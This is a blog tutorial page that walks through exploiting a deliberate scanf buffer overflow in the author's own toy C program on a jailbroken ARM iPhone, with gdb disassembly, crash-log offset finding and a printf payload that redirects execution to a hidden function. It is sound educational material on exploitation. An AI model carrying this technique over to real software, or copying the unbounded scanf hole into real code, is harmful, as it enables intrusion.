<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="generator" content="Hugo 0.74.3" />

  <title>0x02 Exploiting buffer overflow vulnerability &middot; dee</title>

  <meta name="description" content="" />

  

<meta itemprop="name" content="0x02 Exploiting buffer overflow vulnerability">
<meta itemprop="description" content="In this example we will disassemble our binary app code in search for hidden function, then we will exploit buffer overflow vulnerability to take advantage of changing our app execution flow.">
<meta itemprop="datePublished" content="2020-08-08T23:07:00+02:00" />
<meta itemprop="dateModified" content="2020-08-08T23:07:00+02:00" />
<meta itemprop="wordCount" content="1476">



<meta itemprop="keywords" content="" />


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="0x02 Exploiting buffer overflow vulnerability"/>
<meta name="twitter:description" content="In this example we will disassemble our binary app code in search for hidden function, then we will exploit buffer overflow vulnerability to take advantage of changing our app execution flow."/>


<meta property="og:title" content="0x02 Exploiting buffer overflow vulnerability" />
<meta property="og:description" content="In this example we will disassemble our binary app code in search for hidden function, then we will exploit buffer overflow vulnerability to take advantage of changing our app execution flow." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://deev3e.github.io/posts/0x02_debug_exploit_buffer_overflow/" />
<meta property="article:published_time" content="2020-08-08T23:07:00+02:00" />
<meta property="article:modified_time" content="2020-08-08T23:07:00+02:00" />



  

  <link type="text/css"
        rel="stylesheet"
        href="/css/print.css"
        media="print">

  <link type="text/css"
        rel="stylesheet"
        href="/css/poole.css">

  <link type="text/css"
        rel="stylesheet"
        href="/css/hyde.css">

  
<style type="text/css">
  .sidebar {
    background-color: #333;
  }

  .read-more-link a {
    border-color: #333;
  }

  .pagination li a {
    color: #333;
    border: 1px solid #333;
  }

  .pagination li.active a {
    background-color: #333;
  }

  .pagination li a:hover {
    background-color: #333;
    opacity: 0.75;
  }

  footer a,
  .content a,
  .related-posts li a:hover {
    color: #333;
  }
</style>



  <link type="text/css" rel="stylesheet" href="/css/blog.css">

  <link rel="stylesheet"
        href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700&display=swap">

  <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css"
        integrity="sha256-mmgLkCYLUQbXn0B1SRqzHar6dCnv9oZFPEC1g1cwlkk="
        crossorigin="anonymous" />

  <link rel="apple-touch-icon-precomposed"
        sizes="144x144"
        href="/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="/favicon.png">

  
  </head>
<body>
  <aside class="sidebar">
  <div class="container">
    <div class="sidebar-about">
      
        
        <div class="author-image">
          <img src="/images/profile.png" class="img-circle img-headshot center" alt="Profile Picture">
        </div>
        
      

      <h1>dee</h1>

      
      <p class="lead">ARM &amp; iOS exploiting</p>
      
    </div>

    <nav>
      <ul class="sidebar-nav">
        <li>
          <a href="https://deev3e.github.io">Home</a>
        </li>
        <li>
          <a href="/posts/">Posts</a>
        </li><li>
          <a href="/about/">About</a>
        </li><li>
          <a href="/resources/">Resources</a>
        </li>
      </ul>
    </nav>

    <section class="social-icons">
      
      <a href="https://www.linkedin.com/in/dagmarazawada/" rel="me" title="Linkedin" target="_blank">
        <i class="fab fa-linkedin" aria-hidden="true"></i>
      </a>
      
      <a href="#" rel="me" title="GitHub" target="_blank">
        <i class="fab fa-github" aria-hidden="true"></i>
      </a>
      
      <a href="#" rel="me" title="Twitter" target="_blank">
        <i class="fab fa-twitter" aria-hidden="true"></i>
      </a>
      
    </section>
  </div>
</aside>


  <main class="content container">
  <div class="post">
  <h1>0x02 Exploiting buffer overflow vulnerability</h1>

  <div class="post-date">
    <time datetime="2020-08-08T23:07:00&#43;0200">Aug 8, 2020</time> &middot; 7 min read
  </div>

  <p>In this example we will disassemble our binary app code in search for hidden function, then we will exploit buffer overflow vulnerability to take advantage of changing our app execution flow.</p>
<h2 id="0x02c">0x02.c</h2>
<p>Let&rsquo;s create new file <code>0x02.c</code> with code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hidden</span>(){
    printf(<span style="color:#e6db74">&#34;You run hidden function, yay! ;) &#34;</span>);
    system(<span style="color:#e6db74">&#34;uname -a&#34;</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
    printf(<span style="color:#e6db74">&#34;0x02 Hello Buffer Overflow with Hidden Function</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
    printf(<span style="color:#e6db74">&#34;enter some data:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

    <span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">12</span>];
    scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, buff);
    printf(<span style="color:#e6db74">&#34;You entered: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buff);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

</code></pre></div><p>Compile and sign binary:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ clang 0x02.c -fno-stack-protector -fno-pie -arch armv7 -mios-version-min<span style="color:#f92672">=</span><span style="color:#ae81ff">6</span> -mno-thumb -isysroot /var/root/theos/sdks/iPhoneOS10.3.sdk/ -o 0x02
$ ldid -S 0x02
</code></pre></div><p>All right, so when we run our app normally, it should print some info, wait for user input and print that data it received. But if we try to enter more data than it expects we can crash it like in previous example:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./0x02 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault: <span style="color:#ae81ff">11</span>
</code></pre></div><p>And take a look at our crash report:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /var/mobile/Library/Logs/CrashReporter/0x02-2020-08-04-113352.ips 
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...
Thread <span style="color:#ae81ff">0</span> crashed with ARM Thread State (<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span>bit)<span style="color:#f92672">:</span>
    r0: <span style="color:#ae81ff">0x00000000</span>    r1: <span style="color:#ae81ff">0x00000000</span>      r2: <span style="color:#ae81ff">0x3af14f80</span>      r3: <span style="color:#ae81ff">0x00000000</span>
    r4: <span style="color:#ae81ff">0x00000000</span>    r5: <span style="color:#ae81ff">0x0000bec0</span>      r6: <span style="color:#ae81ff">0x00000000</span>      r7: <span style="color:#ae81ff">0x41414141</span>
    r8: <span style="color:#ae81ff">0x00217d40</span>    r9: <span style="color:#ae81ff">0x00000000</span>     r10: <span style="color:#ae81ff">0x00000000</span>     r11: <span style="color:#ae81ff">0x00000000</span>
    ip: <span style="color:#ae81ff">0x00012068</span>    sp: <span style="color:#ae81ff">0x00217d30</span>      lr: <span style="color:#ae81ff">0x0000bf2c</span>      pc: <span style="color:#ae81ff">0x41414140</span>
  cpsr: <span style="color:#ae81ff">0x40000030</span>
...
</code></pre></div><p>In <code>pc</code> value we again notice this address: <code>0x41414140</code>. <code>41</code> is hex value for capital letter <code>A</code> which means that our program has overwritten program counter with value we entered. Other letter reference can be found in <a href="/resources/ascii_table/"><strong>ASCII tables</strong></a>.</p>
<p>To find which part of our string actually got written to <code>pc</code>, we can serve our script value with which we can easily distinguish values (with ASCII/hex tables):</p>
<p><code>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK</code></p>
<p>In crash report, we can see that the value written to <code>pc</code> is <code>0x46464644</code>. Looking at the ascii/hex tables this is value of <code>FFFF</code>. Write that down, as we need this information to know how much offset we need to pass another function memory address in stead of dummy value.</p>
<h2 id="disassembling">Disassembling</h2>
<p>To analyse our program we will disassemble binary with <code>gdb</code> (or <code>lldb</code>, works simmilar).
Checkout <code>gdb</code> cheat sheet here <a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf</a> .</p>
<p>Every C progamm has a <code>main()</code> function, so let&rsquo;s try to see what happens in this app main function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gdb 0x02
$ <span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble main

Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
0x0000bea8 &lt;main+0&gt;:  <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">40</span> 2d e9                   push	<span style="color:#f92672">{</span>r7, lr<span style="color:#f92672">}</span>
0x0000beac &lt;main+4&gt;:  0d <span style="color:#ae81ff">70</span> a0 e1                   mov	r7, sp
0x0000beb0 &lt;main+8&gt;:  <span style="color:#ae81ff">20</span> d0 4d e2                   sub	sp, sp, <span style="color:#75715e">#32	; 0x20</span>
0x0000beb4 &lt;main+12&gt;:  9b 0f 0b e3                   movw	r0, <span style="color:#75715e">#49051	; 0xbf9b</span>
0x0000beb8 &lt;main+16&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">40</span> e3                   movt	r0, <span style="color:#75715e">#0	; 0x0</span>
0x0000bebc &lt;main+20&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">00</span> e3                   movw	r1, <span style="color:#75715e">#0	; 0x0</span>
0x0000bec0 &lt;main+24&gt;:  <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">07</span> e5                   str	r1, <span style="color:#f92672">[</span>r7, <span style="color:#75715e">#-4]</span>
0x0000bec4 &lt;main+28&gt;:  4a <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
0x0000bec8 &lt;main+32&gt;:  cc 1f 0b e3                   movw	r1, <span style="color:#75715e">#49100	; 0xbfcc</span>
0x0000becc &lt;main+36&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
0x0000bed0 &lt;main+40&gt;:  0c <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#12]</span>
0x0000bed4 &lt;main+44&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
0x0000bed8 &lt;main+48&gt;:  <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
0x0000bedc &lt;main+52&gt;:  de 1f 0b e3                   movw	r1, <span style="color:#75715e">#49118	; 0xbfde</span>
0x0000bee0 &lt;main+56&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
0x0000bee4 &lt;main+60&gt;:  <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">20</span> 8d e2                   add	r2, sp, <span style="color:#75715e">#16	; 0x10</span>
0x0000bee8 &lt;main+64&gt;:  <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#8]</span>
0x0000beec &lt;main+68&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
0x0000bef0 &lt;main+72&gt;:  <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">10</span> a0 e1                   mov	r1, r2
0x0000bef4 &lt;main+76&gt;:  3f <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff8
0x0000bef8 &lt;main+80&gt;:  e1 1f 0b e3                   movw	r1, <span style="color:#75715e">#49121	; 0xbfe1</span>
0x0000befc &lt;main+84&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
0x0000bf00 &lt;main+88&gt;:  <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">20</span> 8d e2                   add	r2, sp, <span style="color:#75715e">#16	; 0x10</span>
0x0000bf04 &lt;main+92&gt;:  <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#4]</span>
0x0000bf08 &lt;main+96&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
0x0000bf0c &lt;main+100&gt;:  <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">10</span> a0 e1                   mov	r1, r2
0x0000bf10 &lt;main+104&gt;:  <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
0x0000bf14 &lt;main+108&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">00</span> e3                   movw	r1, <span style="color:#75715e">#0	; 0x0</span>
0x0000bf18 &lt;main+112&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp<span style="color:#f92672">]</span>
0x0000bf1c &lt;main+116&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
0x0000bf20 &lt;main+120&gt;:  <span style="color:#ae81ff">07</span> d0 a0 e1                   mov	sp, r7
0x0000bf24 &lt;main+124&gt;:  <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">80</span> bd e8                   pop	<span style="color:#f92672">{</span>r7, pc<span style="color:#f92672">}</span>
End of assembler dump.
</code></pre></div><p>These lines state the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">0x0000bec0          &lt;main+0&gt;:	            push	                    <span style="color:#f92672">{</span>r7, lr<span style="color:#f92672">}</span>
memory location     offset from main<span style="color:#f92672">()</span>      arm assembly instruction    registers 
</code></pre></div><p>Ok, we know something about main function, but what are other functions in this program? We can check it in <code>gdb</code> with following command. We should get a lot of <code>__dyld</code> functions, but at the end there is listed something interesting - function named <code>hidden</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions
All defined functions:
Non-debugging symbols:
...
0x0000be70  hidden
0x0000bea8  main
0x0000bf28   stub helpers
0x0000bff4  dyld_stub_printf
0x0000bff8  dyld_stub_scanf
0x0000bffc  dyld_stub_system
</code></pre></div><p>Other versions of <code>gdb</code> may work slightly different, display more or less info, etc, but in general it should show data as above. Not at the moment, but with the time it will be helpful to get to know a little bit more about basic assembly instructions to analyse binary more deeply. For now, we should notice that binary we analyse is basically calling functions: <code>printf</code>, <code>scanf</code> and <code>system</code>. The last two shouldn&rsquo;t be used in normal apps but here&rsquo;s just for tutorial process.</p>
<p>In C programming is known that <code>scanf</code> is a vulnerable function due to it&rsquo;s lack of data bounds checking, leading to possibility of writing to stack more characters than declared resulting in overwriting other data. Of course we will take advantage of this in exploiting our program.</p>
<p>But first let&rsquo;s check out addresses of our hidden function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gdb 0x02
$ <span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble hidden

Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> hidden:
0x0000be70 &lt;hidden+0&gt;:  <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">40</span> 2d e9                   push	<span style="color:#f92672">{</span>r7, lr<span style="color:#f92672">}</span>
0x0000be74 &lt;hidden+4&gt;:  0d <span style="color:#ae81ff">70</span> a0 e1                   mov	r7, sp
0x0000be78 &lt;hidden+8&gt;:  <span style="color:#ae81ff">08</span> d0 4d e2                   sub	sp, sp, <span style="color:#75715e">#8	; 0x8</span>
0x0000be7c &lt;hidden+12&gt;:  <span style="color:#ae81ff">70</span> 0f 0b e3                   movw	r0, <span style="color:#75715e">#49008	; 0xbf70</span>
0x0000be80 &lt;hidden+16&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">40</span> e3                   movt	r0, <span style="color:#75715e">#0	; 0x0</span>
0x0000be84 &lt;hidden+20&gt;:  5a <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbff4
0x0000be88 &lt;hidden+24&gt;:  <span style="color:#ae81ff">92</span> 1f 0b e3                   movw	r1, <span style="color:#75715e">#49042	; 0xbf92</span>
0x0000be8c &lt;hidden+28&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">40</span> e3                   movt	r1, <span style="color:#75715e">#0	; 0x0</span>
0x0000be90 &lt;hidden+32&gt;:  <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp, <span style="color:#75715e">#4]</span>
0x0000be94 &lt;hidden+36&gt;:  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> a0 e1                   mov	r0, r1
0x0000be98 &lt;hidden+40&gt;:  <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> eb                   bl	0xbffc
0x0000be9c &lt;hidden+44&gt;:  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 8d e5                   str	r0, <span style="color:#f92672">[</span>sp<span style="color:#f92672">]</span>
0x0000bea0 &lt;hidden+48&gt;:  <span style="color:#ae81ff">07</span> d0 a0 e1                   mov	sp, r7
0x0000bea4 &lt;hidden+52&gt;:  <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">80</span> bd e8                   pop	<span style="color:#f92672">{</span>r7, pc<span style="color:#f92672">}</span>
End of assembler dump.
</code></pre></div><p>This function starts at address: <code>0x0000be70</code>. We will try to input that address into <code>pc</code> to change our program execution.</p>
<p>Now since we know that out string overwrites <code>pc</code> with values after <code>AAAABBBBCCCCDDDDEEEE</code>, we will put our hidden function address right after this string.</p>
<p>Because our architecture is little endian, we should craft our address in reversed way like so:</p>
<pre><code>\x70\xbe\x00\x00
</code></pre><p>which will result in writing to pc address <code>0000be70</code> - and this is entry address of <code>hidden()</code> function. So let&rsquo;s try it:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ printf <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEE\x70\xbe\x00\x00&#34;</span> | ./0x02
0x02 Hello Buffer Overflow with Hidden Function
enter some data:
You entered: AAAABBBBCCCCDDDDEEEEp?
You run hidden <span style="color:#66d9ef">function</span>, yay! ;<span style="color:#f92672">)</span>
Darwin iPhone 16.7.0 Darwin Kernel Version 16.7.0: Wed Jul <span style="color:#ae81ff">26</span> 11:08:56 PDT 2017; root:xnu-3789.70.16~21/MarijuanARM_S5L8950X iPhone5,2 arm N42AP Darwin
Bus error: <span style="color:#ae81ff">10</span>

</code></pre></div><p>Yeah we did it 😎 we modified running program execution making it do what we wanted, running hidden function 😄
Before ending let&rsquo;s just check out addresses crash report:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /var/mobile/Library/Logs/CrashReporter/0x02-2020-08-05-134552.ips 
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">...
Exception Type:  EXC_BAD_ACCESS (SIGBUS)
Exception Subtype: EXC_ARM_DA_ALIGN at <span style="color:#ae81ff">0x45454545</span>
Termination Signal: Bus error: <span style="color:#ae81ff">10</span>
...
Thread <span style="color:#ae81ff">0</span> crashed with ARM Thread State (<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span>bit)<span style="color:#f92672">:</span>
    r0: <span style="color:#ae81ff">0x00000000</span>    r1: <span style="color:#ae81ff">0x00000000</span>      r2: <span style="color:#ae81ff">0x6e440093</span>      r3: <span style="color:#ae81ff">0x00000103</span>
    r4: <span style="color:#ae81ff">0x00000000</span>    r5: <span style="color:#ae81ff">0x0000bea8</span>      r6: <span style="color:#ae81ff">0x00000000</span>      r7: <span style="color:#ae81ff">0x45454545</span>
    r8: <span style="color:#ae81ff">0x001a7d58</span>    r9: <span style="color:#ae81ff">0x00000000</span>     r10: <span style="color:#ae81ff">0x00000000</span>     r11: <span style="color:#ae81ff">0x00000000</span>
    ip: <span style="color:#ae81ff">0x3a051398</span>    sp: <span style="color:#ae81ff">0x45454545</span>      lr: <span style="color:#ae81ff">0x00000000</span>      pc: <span style="color:#ae81ff">0x0000bf24</span>
  cpsr: <span style="color:#ae81ff">0x60000010</span>
...
</code></pre></div><p>The thing I couldn&rsquo;t get for few hours was that why my program crashed at <code>pc: 0x0000bf24</code>, not the value I expected to be there (I entered and was expecting to see <code>0000be70</code> here). When you take a look at disassembled functions in <code>gdb</code> again, you will notice that this is the address of last <code>pop</code> assembly instruction in <code>main()</code> function.</p>
<p>What I am trying to say here is that sometimes you can see no output of your program execution override, but analysing carefully addresses and disassembling functions can tell you that you achieved intended purpose but there may be some other reasons you can see no output in shell (just in example). It took me some time to get that with a lot of searching and trying different input strings etc., so don&rsquo;t give up if something doesn&rsquo;t work for you.</p>
<p>And congrats on your first successful exploit achieved! 😉</p>
<pre><code class="language-quote" data-lang="quote">/Sidenote/
If you get &quot;Illegal instruction: 4&quot; while running gdb or objdump or other tool, try to run:

sed -i'' 's/\x00\x30\x93\xe4/\x00\x30\x93\xe5/g;s/\x00\x30\xd3\xe4/\x00\x30\xd3\xe5/g;' /usr/bin/gdb
ldid -s /usr/bin/gdb
</code></pre>
</div>


  </main>

  <footer>
  <div>
    &copy; dagmara 2020

    &middot; <a href="https://creativecommons.org/licenses/by-sa/4.0" target="_blank">CC BY-SA 4.0</a>

    
  </div>
</footer>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js"
          integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0="
          crossorigin="anonymous"></script>

  

  
</body>
</html>
